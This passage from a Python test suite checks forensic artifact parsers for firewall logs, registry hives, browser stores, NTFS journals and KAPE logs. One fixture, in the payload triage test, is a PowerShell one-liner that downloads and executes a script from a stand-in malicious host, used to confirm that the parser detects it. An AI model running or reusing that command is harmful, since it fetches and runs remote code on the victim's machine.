        self.assertEqual(events[0].dst_ip, '8.8.8.8')
        self.assertEqual(events[0].rule_title, 'ConnectionSuccess')
        self.assertEqual(json.loads(events[0].extra_fields)['report_id'], '42')

    def test_mde_xdr_preserves_ipv6_without_populating_ip_columns(self):
        parser = MdeXdrParser(case_id=1)

        with tempfile.NamedTemporaryFile('w', suffix='.csv', delete=False) as handle:
            handle.write(
                'Timestamp,DeviceName,ActionType,LocalIP,RemoteIP,RemotePort\n'
                '2026-03-20T10:00:00Z,HOST1,ConnectionSuccess,2001:db8::10,2001:db8::20,443\n'
            )
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertIsNone(events[0].src_ip)
        self.assertIsNone(events[0].dst_ip)
        extra = json.loads(events[0].extra_fields)
        self.assertEqual(extra['src_ip_raw'], '2001:db8::10')
        self.assertEqual(extra['dst_ip_raw'], '2001:db8::20')

    def test_palo_alto_parser_maps_core_network_fields(self):
        parser = PaloAltoParser(case_id=1, case_tz='America/New_York')

        with tempfile.NamedTemporaryFile('w', suffix='.csv', delete=False) as handle:
            handle.write(
                'Receive Time,Source address,Destination address,Source Port,Destination Port,Action,Rule,Application,Threat/Content Name,Source User\n'
                '2026-03-20 10:00:00,10.0.0.10,1.1.1.1,51515,443,allow,Internet Access,ssl,,alice\n'
            )
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'palo_alto')
        self.assertEqual(events[0].src_ip, '10.0.0.10')
        self.assertEqual(events[0].dst_port, 443)
        self.assertEqual(events[0].rule_title, 'allow')
        self.assertEqual(events[0].timestamp_source_tz, 'America/New_York')

    def test_pfsense_parser_extracts_ips_from_filterlog(self):
        parser = PfSenseParser(case_id=1)

        with tempfile.NamedTemporaryFile('w', suffix='.log', delete=False) as handle:
            handle.write(
                'Mar 20 10:00:00 fw01 filterlog: 5,,,1000000103,igb1,match,block,in,4,0x0,,64,12345,0,none,6,tcp,60,10.0.0.10,1.1.1.1,51515,443,0,S\n'
            )
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'pfsense')
        self.assertEqual(events[0].src_ip, '10.0.0.10')
        self.assertEqual(events[0].dst_ip, '1.1.1.1')
        self.assertEqual(events[0].rule_title, 'block')

    def test_firewall_parser_preserves_ipv6_without_populating_ip_columns(self):
        parser = FirewallLogParser(case_id=1)

        with tempfile.NamedTemporaryFile('w', suffix='.log', delete=False) as handle:
            handle.write(
                'Mar 20 10:00:00 fw01 kernel: src=2001:db8::10 dst=2001:db8::20 proto=tcp action=allow\n'
            )
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertIsNone(events[0].src_ip)
        self.assertIsNone(events[0].dst_ip)
        extra = json.loads(events[0].extra_fields)
        self.assertEqual(extra['src_ip_raw'], '2001:db8::10')
        self.assertEqual(extra['dst_ip_raw'], '2001:db8::20')

    def test_generic_json_parser_preserves_ipv6_without_populating_ip_columns(self):
        parser = GenericJSONParser(case_id=1)

        with tempfile.NamedTemporaryFile('w', suffix='.jsonl', delete=False) as handle:
            handle.write(json.dumps({
                '@timestamp': '2026-03-20T10:00:00Z',
                'host': {'hostname': 'HOST1'},
                'source': {'ip': '2001:db8::10'},
                'destination': {'ip': '2001:db8::20'},
            }) + '\n')
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertIsNone(events[0].src_ip)
        self.assertIsNone(events[0].dst_ip)
        extra = json.loads(events[0].extra_fields)
        self.assertEqual(extra['src_ip_raw'], '2001:db8::10')
        self.assertEqual(extra['dst_ip_raw'], '2001:db8::20')

    def test_csv_log_parser_preserves_ipv6_without_populating_ip_columns(self):
        parser = CSVLogParser(case_id=1)

        with tempfile.NamedTemporaryFile('w', suffix='.csv', delete=False) as handle:
            handle.write(
                'timestamp,hostname,source ip,destination ip\n'
                '2026-03-20T10:00:00Z,HOST1,2001:db8::10,2001:db8::20\n'
            )
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertIsNone(events[0].src_ip)
        self.assertIsNone(events[0].dst_ip)
        extra = json.loads(events[0].extra_fields)
        self.assertEqual(extra['src_ip_raw'], '2001:db8::10')
        self.assertEqual(extra['dst_ip_raw'], '2001:db8::20')

    def test_powershell_history_parser_emits_commands(self):
        parser = PowerShellHistoryParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            history_dir = os.path.join(
                tmpdir, 'Users', 'alice', 'AppData', 'Roaming', 'Microsoft',
                'Windows', 'PowerShell', 'PSReadLine'
            )
            os.makedirs(history_dir, exist_ok=True)
            file_path = os.path.join(history_dir, 'ConsoleHost_history.txt')
            with open(file_path, 'w', encoding='utf-8') as handle:
                handle.write('Get-Process\n\nwhoami\n')

            events = list(parser.parse(file_path))

        self.assertEqual(len(events), 2)
        self.assertEqual(events[0].artifact_type, 'powershell_history')
        self.assertEqual(events[0].command_line, 'Get-Process')
        self.assertEqual(events[1].command_line, 'whoami')

    def test_hosts_file_parser_emits_mappings(self):
        parser = HostsFileParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            hosts_dir = os.path.join(tmpdir, 'Windows', 'System32', 'drivers', 'etc')
            os.makedirs(hosts_dir, exist_ok=True)
            file_path = os.path.join(hosts_dir, 'hosts')
            with open(file_path, 'w', encoding='utf-8') as handle:
                handle.write('# comment\n127.0.0.1 localhost local\n')

            events = list(parser.parse(file_path))

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'hosts')
        self.assertEqual(events[0].remote_host, '127.0.0.1')
        self.assertEqual(events[0].target_path, 'localhost local')

    def test_setupapi_log_parser_emits_timestamped_actions(self):
        parser = SetupApiLogParser(case_id=1, case_tz='America/New_York')

        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, 'setupapi.dev.log')
            with open(file_path, 'w', encoding='utf-8') as handle:
                handle.write('[Boot Session: 2026/02/10 23:45:13.500]\n')
                handle.write('>>>  [Unstage Driver Updates]\n')
                handle.write('>>>  Section start 2026/02/10 23:45:32.314\n')
                handle.write('sto: {Unstage Driver Package: C:\\\\Windows\\\\example.inf} 23:45:32.386\n')

            events = list(parser.parse(file_path))

        self.assertGreaterEqual(len(events), 2)
        self.assertTrue(all(event.artifact_type == 'setupapi' for event in events))
        self.assertTrue(all(event.timestamp_source_tz == 'America/New_York' for event in events))
        self.assertTrue(any('Unstage Driver Updates' in event.search_blob for event in events))
        self.assertTrue(any(event.target_path.endswith('example.inf') for event in events))

    def test_registry_interesting_keys_include_hive_specific_targets(self):
        parser = object.__new__(RegistryParser)
        BaseParser.__init__(parser, case_id=1, source_host='', case_file_id=None, case_tz='UTC')

        sam_keys = parser._interesting_keys_for_hive('SAM')
        amcache_keys = parser._interesting_keys_for_hive('AMCACHE')
        usrclass_keys = parser._interesting_keys_for_hive('USRCLASS.DAT')

        self.assertIn(r'SAM\Domains\Account\Users', sam_keys)
        self.assertIn(r'Root\InventoryApplicationFile', amcache_keys)
        self.assertIn(r'Local Settings\Software\Microsoft\Windows\Shell\BagMRU', usrclass_keys)

    def test_registry_defaults_to_full_hive_extraction(self):
        self.assertTrue(RegistryParser.DEFAULT_EXTRACT_ALL)
        extract_all_default = inspect.signature(RegistryParser.__init__).parameters['extract_all'].default
        self.assertTrue(extract_all_default)

    def test_registry_full_hive_emits_key_and_value_rows_with_preserved_payloads(self):
        long_text = 'A' * 700
        empty_marker = _FakeRegistryKey(
            'Software\\Microsoft\\OneDrive\\Accounts\\Business1\\Tenants',
            values=[],
            subkeys=[],
        )
        account_key = _FakeRegistryKey(
            'Software\\Microsoft\\OneDrive\\Accounts\\Business1',
            values=[
                _FakeRegistryValue('UserEmail', 'alice@contoso.com'),
                _FakeRegistryValue('LongNote', long_text),
                _FakeRegistryValue('BinarySecret', b'A\x00B\x00', value_type='REG_BINARY'),
            ],
            subkeys=[empty_marker],
        )
        root = _FakeRegistryKey('', values=[], subkeys=[account_key])
        parser = self._make_registry_parser(root=root, extract_all=True)

        with tempfile.TemporaryDirectory() as tmpdir:
            hive_path = os.path.join(tmpdir, 'mystery.hve')
            with open(hive_path, 'wb') as handle:
                handle.write(b'regf')

            events = list(parser.parse(hive_path))

        self.assertEqual(len(events), 6)

        key_events = [event for event in events if json.loads(event.raw_json)['registry_record_kind'] == 'key']
        value_events = [event for event in events if json.loads(event.raw_json)['registry_record_kind'] == 'value']

        self.assertEqual(len(key_events), 3)
        self.assertEqual(len(value_events), 3)

        tenant_key_event = next(
            event for event in key_events
            if event.reg_key.endswith('Tenants')
        )
        self.assertEqual(tenant_key_event.reg_value, RegistryParser.KEY_EVENT_VALUE_NAME)
        self.assertEqual(json.loads(tenant_key_event.extra_fields)['hive_type'], 'UNKNOWN')

        email_event = next(event for event in value_events if event.reg_value == 'UserEmail')
        self.assertEqual(email_event.reg_data, 'alice@contoso.com')
        email_payload = json.loads(email_event.raw_json)['value_data']
        self.assertEqual(email_payload['text'], 'alice@contoso.com')
        self.assertEqual(email_payload['storage_kind'], 'str')

        long_event = next(event for event in value_events if event.reg_value == 'LongNote')
        long_payload = json.loads(long_event.raw_json)['value_data']
        long_extra = json.loads(long_event.extra_fields)
        self.assertEqual(long_payload['text'], long_text)
        self.assertTrue(long_extra['summary_truncated'])
        self.assertLess(len(long_event.reg_data), len(long_text))
        self.assertIn('[truncated', long_event.reg_data)

        binary_event = next(event for event in value_events if event.reg_value == 'BinarySecret')
        binary_payload = json.loads(binary_event.raw_json)['value_data']
        self.assertEqual(binary_payload['decoded_as'], 'utf-16-le')
        self.assertEqual(binary_payload['text'], 'AB')
        self.assertEqual(binary_payload['hex'], '41004200')

    def test_registry_dedup_uses_raw_json_for_full_fidelity_rows(self):
        registry_config = get_dedup_config('registry')
        self.assertIn('raw_json', registry_config.unique_fields)

    def test_firefox_extensions_parser_handles_null_nested_fields(self):
        parser = browser_module.FirefoxJSONParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            profile_dir = os.path.join(
                tmpdir, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles', 'abcd.default-release'
            )
            os.makedirs(profile_dir, exist_ok=True)
            file_path = os.path.join(profile_dir, 'extensions.json')
            with open(file_path, 'w', encoding='utf-8') as handle:
                json.dump({
                    'addons': [{
                        'id': 'addon@example.test',
                        'defaultLocale': None,
                        'userPermissions': None,
                        'updateDate': 1710000000000,
                        'active': True,
                    }]
                }, handle)

            events = list(parser.parse(file_path))

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'firefox_addon')
        event_data = json.loads(events[0].raw_json)
        self.assertEqual(event_data['name'], 'addon@example.test')
        self.assertEqual(event_data['permissions'], [])
        self.assertEqual(parser.errors, [])

    def test_browser_sqlite_parses_firefox_origin_storage_db(self):
        parser = BrowserSQLiteParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            storage_dir = os.path.join(
                tmpdir, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles',
                'abcd.default-release', 'storage', 'default', 'https+++example.com', 'idb'
            )
            os.makedirs(storage_dir, exist_ok=True)
            file_path = os.path.join(storage_dir, '12183338011.sqlite')
            conn = sqlite3.connect(file_path)
            conn.execute('CREATE TABLE records (created TEXT, payload TEXT)')
            conn.execute(
                'INSERT INTO records (created, payload) VALUES (?, ?)',
                ('2026-03-15 12:00:00', 'cached-value'),
            )
            conn.commit()
            conn.close()

            events = list(parser.parse(file_path))

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'sqlite_firefox_indexeddb')
        self.assertIn('cached-value', events[0].search_blob)
        self.assertEqual(parser.errors, [])

    def test_prefetch_parser_reports_unsupported_variant_cleanly(self):
        class _UnsupportedPrefetch:
            def __init__(self, _fh):
                raise NotImplementedError('variant not supported')

        parser = object.__new__(PrefetchParser)
        BaseParser.__init__(parser, case_id=1, source_host='HOST1', case_file_id=7, case_tz='UTC')
        parser._prefetch_class = _UnsupportedPrefetch

        with tempfile.NamedTemporaryFile(suffix='.pf', delete=False) as handle:
            handle.write(b'SCCA')
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'prefetch')
        self.assertEqual(events[0].process_name, os.path.basename(file_path).replace('.pf', ''))
        self.assertEqual(parser.errors, [])
        self.assertTrue(any('Unsupported Prefetch variant' in warning for warning in parser.warnings))
        self.assertTrue(any('variant not supported' in warning for warning in parser.warnings))

    def test_prefetch_parser_triages_unexpected_dissect_errors(self):
        class _BrokenPrefetch:
            def __init__(self, _fh):
                raise AttributeError("'NoneType' object has no attribute 'is_leaf'")

        parser = object.__new__(PrefetchParser)
        BaseParser.__init__(parser, case_id=1, source_host='HOST1', case_file_id=7, case_tz='UTC')
        parser._prefetch_class = _BrokenPrefetch

        with tempfile.NamedTemporaryFile(suffix='RUNTIMEBROKER.EXE-4551A062.pf', delete=False) as handle:
            handle.write(b'SCCA')
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'prefetch')
        self.assertIn('RUNTIMEBROKER.EXE', events[0].process_name)
        self.assertEqual(parser.errors, [])
        self.assertTrue(any('is_leaf' in warning for warning in parser.warnings))

    @unittest.skipUnless(c_ntfs is not None, 'dissect.ntfs is not installed')
    def test_usn_parser_emits_reason_flags_and_target_path(self):
        parser = USNParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            extend_dir = os.path.join(tmpdir, '$Extend')
            os.makedirs(extend_dir, exist_ok=True)
            file_path = os.path.join(extend_dir, '$J')
            _write_usn_record(file_path)

            events = list(parser.parse(file_path))

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'usn')
        self.assertEqual(events[0].timestamp_source_tz, 'UTC')
        self.assertTrue(events[0].target_path.endswith('\\evil.exe'))
        self.assertIn('FILE_CREATE', events[0].event_id)
        extra = json.loads(events[0].extra_fields)
        self.assertEqual(extra['filename'], 'evil.exe')
        self.assertEqual(extra['source_flags'], ['NORMAL'])
        self.assertEqual(extra['file_attributes'], ['ARCHIVE'])
        self.assertIn('FILE_CREATE', extra['reason_flags'])
        self.assertEqual(parser.errors, [])

    @unittest.skipUnless(c_ntfs is not None, 'dissect.ntfs is not installed')
    def test_registry_resolves_usn_parser_for_journal_stream_path(self):
        registry = ParserRegistry()

        with tempfile.TemporaryDirectory() as tmpdir:
            extend_dir = os.path.join(tmpdir, '$Extend')
            os.makedirs(extend_dir, exist_ok=True)
            file_path = os.path.join(extend_dir, '$J')
            _write_usn_record(file_path, filename='rename.txt', usn=4321)

            artifact_type, parser = registry.resolve_parser_for_file(
                file_path=file_path,
                case_id=1,
            )

        self.assertEqual(artifact_type, 'usn')
        self.assertIsNotNone(parser)
        self.assertEqual(parser.artifact_type, 'usn')

    def test_activities_cache_missing_sidecar_becomes_warning(self):
        parser = ActivitiesCacheParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = os.path.join(tmpdir, 'ActivitiesCache.db')
            conn = sqlite3.connect(db_path)
            conn.execute('CREATE TABLE Activity (Id TEXT)')
            conn.commit()
            conn.close()

            with patch.object(
                windows_module.sqlite3,
                'connect',
                side_effect=sqlite3.OperationalError(f"unable to open database file: '{db_path}-wal'"),
            ):
                events = list(parser.parse(db_path))

        self.assertEqual(events, [])
        self.assertEqual(parser.errors, [])
        self.assertEqual(len(parser.warnings), 1)
        self.assertIn('sidecar unavailable', parser.warnings[0].lower())

    def test_recycle_bin_parser_decodes_windows_10_i_record(self):
        parser = RecycleBinParser(case_id=1)
        original_path = r'C:\Users\jdube\Downloads\evil.exe'
        encoded_path = original_path.encode('utf-16-le')
        deletion_time = datetime(2026, 4, 25, 22, 0, 0)
        filetime = int((deletion_time - datetime(1601, 1, 1)).total_seconds() * 10000000)

        with tempfile.TemporaryDirectory() as tmpdir:
            recycle_dir = os.path.join(tmpdir, 'C', '$Recycle.Bin', 'S-1-5-21-1')
            os.makedirs(recycle_dir, exist_ok=True)
            file_path = os.path.join(recycle_dir, '$IABC123.exe')
            companion_path = os.path.join(recycle_dir, '$RABC123.exe')
            with open(file_path, 'wb') as handle:
                handle.write(struct.pack('<QQQI', 2, 12345, filetime, len(encoded_path)))
                handle.write(encoded_path)
            with open(companion_path, 'wb') as handle:
                handle.write(b'MZ')

            events = list(parser.parse(file_path))

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'recycle_bin')
        self.assertEqual(events[0].target_path, original_path)
        self.assertEqual(events[0].file_size, 12345)
        extra = json.loads(events[0].extra_fields)
        self.assertTrue(extra['companion_exists'])
        self.assertEqual(extra['recycle_sid'], 'S-1-5-21-1')

    def test_payload_triage_parser_hashes_pe_and_finds_script_indicators(self):
        pe_parser = PayloadTriageParser(case_id=1)
        script_parser = PayloadTriageParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            pe_path = os.path.join(tmpdir, 'evil.exe')
            pe_data = bytearray(512)
            pe_data[0:2] = b'MZ'
            struct.pack_into('<I', pe_data, 0x3C, 0x80)
            pe_data[0x80:0x84] = b'PE\x00\x00'
            struct.pack_into('<HHI', pe_data, 0x84, 0x8664, 3, 1710000000)
            with open(pe_path, 'wb') as handle:
                handle.write(pe_data)

            script_path = os.path.join(tmpdir, 'payload.ps1')
            with open(script_path, 'w', encoding='utf-8') as handle:
                handle.write("IEX(New-Object Net.WebClient).DownloadString('http://bad.example/a.ps1')")

            pe_events = list(pe_parser.parse(pe_path))
            script_events = list(script_parser.parse(script_path))

        self.assertEqual(pe_events[0].artifact_type, 'file_triage')
        self.assertTrue(json.loads(pe_events[0].raw_json)['pe_header_found'])
        self.assertEqual(len(pe_events[0].file_hash_sha256), 64)
        self.assertIn('downloadstring', script_events[0].search_blob.lower())
        self.assertIn('http://bad.example/a.ps1', script_events[0].search_blob)

    def test_kape_gap_parsers_are_registered_and_cataloged(self):
        registry = ParserRegistry()
        registered = registry.list_parsers()

        for parser_key in [
            'recycle_bin', 'file_triage', 'kape_log', 'office_autosave',
            'windows_search_db', 'diagnostic_log', 'ntfs_metadata',
            'windows_error_report', 'crash_dump_triage', 'wbem_repository',
            'browser_state', 'cloud_metadata', 'transaction_sidecar',
        ]:
            self.assertIn(parser_key, registered)
            self.assertIn(parser_key, catalog_module.PARSER_CAPABILITIES_BY_KEY)

        self.assertIn('recycle_bin', catalog_module.HUNTING_TAB_TYPES['filesystem'])
        self.assertIn('file_triage', catalog_module.HUNTING_TAB_TYPES['filesystem'])
        self.assertIn('windows_etl', catalog_module.HUNTING_TAB_TYPES['events'])
        self.assertIn('windows_etl_event', catalog_module.HUNTING_TAB_TYPES['events'])
        self.assertIn('etl_trace', catalog_module.HUNTING_TAB_TYPES['events'])
        self.assertIn('ntfs_logfile_event', catalog_module.HUNTING_TAB_TYPES['filesystem'])
        self.assertIn('browser_state', catalog_module.HUNTING_TAB_TYPES['browsers'])
        self.assertIn('kape_log', catalog_module.HUNTING_TAB_TYPES['acquisition'])
        self.assertNotIn('kape_log', catalog_module.HUNTING_TAB_TYPES['events'])
        self.assertEqual(
            len(catalog_module.PARSER_CAPABILITIES_BY_KEY),
            len(catalog_module.PARSER_CAPABILITIES),
        )

    def test_registry_prefers_kape_log_over_generic_csv(self):
        registry = ParserRegistry()

        with tempfile.NamedTemporaryFile('w', suffix='_CopyLog.csv', delete=False, encoding='utf-8') as handle:
            handle.write('Timestamp,Source,Destination\n2026-04-25T22:00:00Z,C:\\a,C:\\b\n')
            file_path = handle.name
        try:
            artifact_type, parser = registry.resolve_parser_for_file(file_path=file_path, case_id=1)
        finally:
            os.remove(file_path)

        self.assertEqual(artifact_type, 'kape_log')
        self.assertIsInstance(parser, KapeLogParser)

    def test_kape_skip_log_summarizes_deduped_rows(self):
        parser = KapeLogParser(case_id=1)

        with tempfile.NamedTemporaryFile('w', suffix='_SkipLog.csv', delete=False, encoding='utf-8', newline='') as handle:
            handle.write('SourceFile,SourceFileSha1,Reason\n')
            handle.write('C:\\a.log,abc,Deduped\n')
            handle.write('C:\\b.log,def,Deduped\n')
            handle.write('C:\\locked.log,ghi,Access denied\n')
            file_path = handle.name
        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 2)
        self.assertEqual(events[0].event_id, 'skip')
        self.assertEqual(events[0].target_path, 'C:\\locked.log')
        self.assertEqual(events[1].event_id, 'skip_deduped_summary')
        self.assertEqual(json.loads(events[1].extra_fields)['deduped_row_count'], 2)

    def test_vendor_parsers_do_not_claim_forensic_binary_artifacts_by_filename(self):
        defender = DefenderAvParser(case_id=1)
        cisco = CiscoAsaParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            defender_etl = os.path.join(tmpdir, 'EtwRTDefenderApiLogger.etl')
            cisco_evtx = os.path.join(tmpdir, 'Cisco Secure Client - Diagnostics and Reporting Tool.evtx')
            with open(defender_etl, 'wb') as handle:
                handle.write(b'ETLTRACE')
            with open(cisco_evtx, 'wb') as handle:
                handle.write(b'ElfFile\x00')

            self.assertFalse(defender.can_parse(defender_etl))
            self.assertFalse(cisco.can_parse(cisco_evtx))

    def test_ntfs_logfile_parent_metadata_created_when_backend_unavailable(self):
        parser = NtfsMetadataParser(case_id=1, case_file_id=123)

        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, '$LogFile')
            with open(file_path, 'wb') as handle:
                handle.write(b'RSTR\x00\x01\x02RCRD')

            with patch.dict(os.environ, {}, clear=True):
                events = list(parser.parse(file_path))

        self.assertEqual(len(events), 1)
        event = events[0]
        raw_json = json.loads(event.raw_json)
        extra_fields = json.loads(event.extra_fields)

        self.assertEqual(event.artifact_type, 'ntfs_logfile')
        self.assertEqual(event.case_file_id, 123)
        self.assertEqual(raw_json['parser_status'], 'backend_unavailable')
        self.assertIn('missing_companion_mft', raw_json['parser_statuses'])
        self.assertEqual(extra_fields['source_parser'], 'ntfs_log_tracker_adapter')
        self.assertEqual(extra_fields['decoded_record_count'], 0)
        self.assertNotIn('RSTR', event.search_blob)
        self.assertNotIn('RCRD', event.search_blob)

    def test_ntfs_log_tracker_rename_maps_to_ntfs_logfile_event(self):
        parser = NtfsMetadataParser(case_id=1, case_file_id=123)

        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, '$LogFile')
            with open(file_path, 'wb') as handle:
                handle.write(b'RSTR')
            decode_result = parser._new_log_tracker_result('decoded', 'decoded')
            decode_result.update({
                'decoder': 'ntfs_log_tracker_adapter',
                'total_records': 1,
                'decoded_record_count': 1,
                'companion_artifacts': {'mft': True, 'usnjrnl_j': False},
                'parser_statuses': ['decoded', 'missing_companion_usnjrnl'],
            })
            child = parser._normalize_log_tracker_row(
                {
                    'EventType': 'Rename',
                    'Timestamp': '2026-05-10T13:00:00',
                    'OldPath': r'C:\Temp\old.txt',
                    'NewPath': r'C:\Temp\new.txt',
                    'MftReference': '42-1',
                    'ParentMftReference': '5-1',
                    'LSN': '9001',
                    'Confidence': 'high',
                    'Operation': '0x06/0x05',
                    'OpaquePayload': b'\x00binary',
                },
                source_file='$LogFile',
                file_path=file_path,
                hostname='HOST1',
                index=0,
                companion_artifacts=decode_result['companion_artifacts'],
            )
            decode_result['children'] = [child]

            with patch.object(parser, '_run_ntfs_log_tracker', return_value=decode_result):
                events = list(parser.parse(file_path))

        self.assertEqual(len(events), 2)
        parent, child = events
        parent_extra = json.loads(parent.extra_fields)
        child_extra = json.loads(child.extra_fields)

        self.assertEqual(parent.artifact_type, 'ntfs_logfile')
        self.assertEqual(parent_extra['parser_status'], 'decoded')
        self.assertEqual(child.artifact_type, 'ntfs_logfile_event')
        self.assertEqual(child.event_id, 'file_rename')
        self.assertEqual(child.provider, 'NTFS $LogFile')
        self.assertEqual(child.target_path, r'C:\Temp\new.txt')
        self.assertEqual(child.record_id, 9001)
        self.assertEqual(child_extra['event_type'], 'file_rename')
        self.assertEqual(child_extra['mft_reference'], '42-1')
        self.assertEqual(child_extra['parent_mft_reference'], '5-1')
        self.assertEqual(child_extra['confidence'], 'high')
        self.assertTrue(child_extra['companion_artifacts']['mft'])
        self.assertFalse(child_extra['companion_artifacts']['usnjrnl_j'])
        self.assertIn('missing_companion_usnjrnl', child_extra['parser_statuses'])
        self.assertNotIn('binary', child.search_blob)
        self.assertIn(r'C:\Temp\new.txt', child.search_blob)

    def test_ntfs_log_tracker_event_type_mappings(self):
        parser = NtfsMetadataParser(case_id=1)

        cases = {
            'Create': 'file_create',
            'Delete': 'file_delete',
            'Move': 'file_move',
            'Resident Write': 'file_write_resident',
            'Nonresident Write': 'file_write_nonresident',
            'Directory Timestamp Update': 'directory_timestamp_update',
            'Directory Index Update': 'directory_index_update',
        }
        for raw_event, expected in cases.items():
            with self.subTest(raw_event=raw_event):
                event = parser._normalize_log_tracker_row(
                    {
                        'EventType': raw_event,
                        'Timestamp': '2026-05-10T13:00:00',
                        'Path': r'C:\Temp\artifact.bin',
                        'RecordId': '7',
                    },
                    source_file='$LogFile',
                    file_path='/tmp/$LogFile',
                    hostname='HOST1',
                    index=0,
                    companion_artifacts={'mft': False, 'usnjrnl_j': False},
                )
                self.assertIsNotNone(event)
                self.assertEqual(event.event_id, expected)

    def test_unresolved_ntfs_logfile_path_preserves_mft_reference(self):
        parser = NtfsMetadataParser(case_id=1)
        event = parser._normalize_log_tracker_row(
            {
                'EventType': 'Delete',
                'Timestamp': '2026-05-10T13:00:00',
                'MftReference': '44-3',
                'RecordId': '8',
            },
            source_file='$LogFile',
            file_path='/tmp/$LogFile',
            hostname='HOST1',
            index=0,
            companion_artifacts={'mft': False, 'usnjrnl_j': False},
        )

        self.assertIsNotNone(event)
        extra_fields = json.loads(event.extra_fields)
        self.assertEqual(event.target_path, '')
        self.assertEqual(extra_fields['mft_reference'], '44-3')
        self.assertEqual(extra_fields['parser_status'], 'path_resolution_partial')
        self.assertIn('path_resolution_partial', extra_fields['parser_statuses'])

    def test_configured_ntfs_log_tracker_csv_backend_emits_child_events(self):
        parser = NtfsMetadataParser(case_id=1, case_file_id=123)

        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, '$LogFile')
            mft_path = os.path.join(tmpdir, '$MFT')
            usn_dir = os.path.join(tmpdir, '$Extend', '$UsnJrnl')
            os.makedirs(usn_dir)
            usn_path = os.path.join(usn_dir, '$J')
            for candidate in (file_path, mft_path, usn_path):
                with open(candidate, 'wb') as handle:
                    handle.write(b'RSTR')
            backend_path = os.path.join(tmpdir, 'fake_ntfs_log_tracker.py')
            with open(backend_path, 'w', encoding='utf-8') as handle:
                handle.write(
                    "import csv, os, sys\n"
                    "out_dir = sys.argv[sys.argv.index('--out') + 1]\n"
                    "with open(os.path.join(out_dir, 'events.csv'), 'w', newline='', encoding='utf-8') as f:\n"
                    "    writer = csv.DictWriter(f, fieldnames=['EventType', 'Timestamp', 'Path', 'MftReference', 'ParentMftReference', 'RecordId', 'Confidence'])\n"
                    "    writer.writeheader()\n"
                    "    writer.writerow({'EventType': 'Create', 'Timestamp': '2026-05-10T13:00:00', 'Path': 'C:\\\\Temp\\\\created.txt', 'MftReference': '50-1', 'ParentMftReference': '5-1', 'RecordId': '101', 'Confidence': 'high'})\n"
                )

            command = f'{sys.executable} {backend_path} --logfile {{logfile}} --out {{output_dir}} --mft {{mft}} --usn {{usnjrnl}}'
            with patch.dict(os.environ, {'NTFS_LOG_TRACKER_CMD': command}, clear=True):
                events = list(parser.parse(file_path))

        self.assertEqual(len(events), 2)
        parent, child = events
        parent_extra = json.loads(parent.extra_fields)
        child_extra = json.loads(child.extra_fields)

        self.assertEqual(parent_extra['parser_status'], 'decoded')
        self.assertEqual(parent_extra['decoded_record_count'], 1)
        self.assertTrue(parent_extra['companion_artifacts']['mft'])
        self.assertTrue(parent_extra['companion_artifacts']['usnjrnl_j'])
        self.assertEqual(child.artifact_type, 'ntfs_logfile_event')
        self.assertEqual(child.event_id, 'file_create')
        self.assertEqual(child.target_path, r'C:\Temp\created.txt')
        self.assertEqual(child.record_id, 101)
        self.assertEqual(child_extra['confidence'], 'high')
        self.assertEqual(child_extra['mft_reference'], '50-1')
        self.assertTrue(child_extra['companion_artifacts']['mft'])
        self.assertTrue(child_extra['companion_artifacts']['usnjrnl_j'])

    def test_configured_ntfs_log_tracker_sqlite_backend_emits_child_events(self):
        parser = NtfsMetadataParser(case_id=1, case_file_id=123)

        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, '$LogFile')
            with open(file_path, 'wb') as handle:
                handle.write(b'RSTR')
            backend_path = os.path.join(tmpdir, 'fake_ntfs_log_tracker_sqlite.py')
            with open(backend_path, 'w', encoding='utf-8') as handle:
                handle.write(
                    "import os, sqlite3, sys\n"
                    "out_dir = sys.argv[sys.argv.index('--out') + 1]\n"
                    "db_path = os.path.join(out_dir, 'ntfs.db')\n"
                    "conn = sqlite3.connect(db_path)\n"
                    "conn.execute('CREATE TABLE events (EventType TEXT, Timestamp TEXT, Path TEXT, MftReference TEXT, RecordId TEXT)')\n"
